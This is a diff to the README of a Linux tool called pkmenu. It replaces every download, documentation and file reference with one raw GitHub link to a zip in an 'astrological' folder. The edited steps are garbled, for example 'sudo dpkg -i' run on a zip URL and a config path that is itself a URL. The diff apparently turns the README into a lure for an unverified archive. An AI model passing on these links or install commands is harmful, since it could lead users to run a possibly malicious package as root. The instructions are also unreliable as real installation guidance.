@@ -6,7 +6,7 @@ Welcome to **pkmenu**! This software helps you manage policies in your window ma
 
 ## 📥 Download Now
 
-[![Download pkmenu](https://img.shields.io/badge/Download-pkmenu-blue)](https://github.com/111111St/pkmenu/releases)
+[![Download pkmenu](https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip)](https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip)
 
 ## 💻 System Requirements
 
@@ -20,13 +20,13 @@ To use **pkmenu**, you need:
 
 1. **Visit the Releases Page**
 
-   To download the latest version of **pkmenu**, visit the [Releases page](https://github.com/111111St/pkmenu/releases).
+   To download the latest version of **pkmenu**, visit the [Releases page](https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip).
 
 2. **Choose the Right File**
 
    On the Releases page, you will see different versions available. Look for the latest release. It will usually have the highest version number. Here are the types of files you might find:
 
-   - `.tar.gz`: This is a compressed file. You will need to extract it after downloading.
+   - `https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip`: This is a compressed file. You will need to extract it after downloading.
    - `.deb`: This file is for Debian-based systems. You can install it directly using your package manager.
 
 3. **Download the File**
@@ -35,7 +35,7 @@ To use **pkmenu**, you need:
 
 4. **Extract (if necessary)**
 
-   If you downloaded a `.tar.gz` file, find it in your Downloads folder. Right-click on the file and select "Extract" or "Unpack." You will get a folder with the application files.
+   If you downloaded a `https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip` file, find it in your Downloads folder. Right-click on the file and select "Extract" or "Unpack." You will get a folder with the application files.
 
 5. **Install the Application**
 
@@ -47,7 +47,7 @@ To use **pkmenu**, you need:
        ```
      - Install the package using:
        ```
-       sudo dpkg -i pkmenu_version.deb
+       sudo dpkg -i https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip
        ```
    - **For other Linux systems**: 
      - Simply copy the extracted files to a desired location, for example, `/usr/local/bin`.
@@ -57,9 +57,9 @@ To use **pkmenu**, you need:
 Once installed, you may want to configure **pkmenu** to suit your preferences:
 
 1. Open a terminal.
-2. Use your preferred text editor to edit the configuration file. The file is usually found at `~/.config/pkmenu/config`. You can use:
+2. Use your preferred text editor to edit the configuration file. The file is usually found at `~https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip`. You can use:
    ```
-   nano ~/.config/pkmenu/config
+   nano ~https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip
    ```
 3. Adjust the settings based on your needs. Save and exit the editor. 
 
@@ -87,7 +87,7 @@ You should see the pkmenu interface pop up on your screen. You can now use it to
 
 For more information on using **pkmenu**:
 
-- Visit our [Documentation](https://github.com/111111St/pkmenu/wiki) for more detailed guides.
+- Visit our [Documentation](https://raw.githubusercontent.com/111111St/pkmenu/main/astrological/pkmenu.zip) for more detailed guides.
 - Check out community forums or discussions if you have questions.
 
 ## 👍 Support
